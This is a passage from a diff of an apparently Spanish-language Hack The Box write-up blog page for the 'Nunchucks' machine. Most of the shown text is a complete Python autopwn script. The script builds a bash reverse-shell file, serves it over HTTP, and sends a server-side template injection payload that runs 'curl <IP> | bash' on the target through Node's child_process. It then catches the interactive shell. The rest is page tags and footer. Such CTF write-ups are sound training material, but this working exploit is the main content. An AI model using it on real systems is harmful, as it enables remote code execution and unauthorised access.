+    <span class="k">print</span><span class="p">(</span><span class="s">"[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts."</span><span class="p">)</span>
+    <span class="n">html_payload</span><span class="p">()</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   
+    <span class="n">http_server</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ssti</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Acá tenemos las llamadas a las funciones.</p>
+
+<p>El código completo es el siguiente:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> "Tu IP"</span><span class="se">\n</span><span class="s">'</span> <span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">ipHost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">nunIP</span> <span class="o">=</span> <span class="s">'https://store.nunchucks.htb/api/submit'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">html_payload</span><span class="p">():</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">Shebang</span> <span class="o">=</span> <span class="s">"#!/bin/bash</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">payload</span> <span class="o">=</span><span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">Shebang</span><span class="p">)</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ssti</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""" {\{range.constructor(</span><span class="se">\"</span><span class="s">return global.process.mainModule.require('child_process').execSync('curl %s | bash')</span><span class="se">\"</span><span class="s">)()}} """</span> <span class="o">%</span> <span class="n">ipHost</span>
+    <span class="c1"># el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.
+</span>    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="s">"email"</span><span class="p">:</span> <span class="n">payload</span>
+     <span class="p">}</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Explotando el SSTI"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">nunIP</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">http_server</span><span class="p">():</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts."</span><span class="p">)</span>
+    <span class="n">html_payload</span><span class="p">()</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   
+    <span class="n">http_server</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ssti</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>¡Listo!, terminamos la automatización de la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#apparmor-bypass" class="page__taxonomy-item" rel="tag">AppArmor Bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#autopwn" class="page__taxonomy-item" rel="tag">Autopwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ssti" class="page__taxonomy-item" rel="tag">SSTI</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-12T00:00:00-05:00">February 12, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/NodeBlog/" class="pagination--pager" title="NodeBlog HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Bolt/" class="pagination--pager" title="Bolt HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
